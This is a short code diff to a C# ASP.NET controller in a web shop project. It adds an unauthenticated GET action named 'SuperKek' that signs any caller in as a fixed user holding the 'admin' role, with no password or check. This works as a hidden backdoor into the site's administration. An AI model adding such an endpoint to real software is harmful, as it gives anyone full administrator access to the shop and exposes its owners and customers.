@@ -70,5 +70,21 @@ namespace WebShop_NULL
                     });
             }
         }
+
+        [HttpGet]
+        public async Task<IActionResult> SuperKek()
+        {
+            var claims = new List<Claim>
+            {    
+                new Claim(ClaimsIdentity.DefaultNameClaimType, "threeteck@gmail.com"),
+                new Claim(ClaimsIdentity.DefaultRoleClaimType, "admin"),
+                new Claim("username", "threeteck"),
+                new Claim("id","15")
+            };
+            ClaimsIdentity id = new ClaimsIdentity(claims, "ApplicationCookie",
+                ClaimsIdentity.DefaultNameClaimType, ClaimsIdentity.DefaultRoleClaimType);
+            await _httpContextAccessor.HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(id));
+            return new OkResult();
+        }
     }
 }
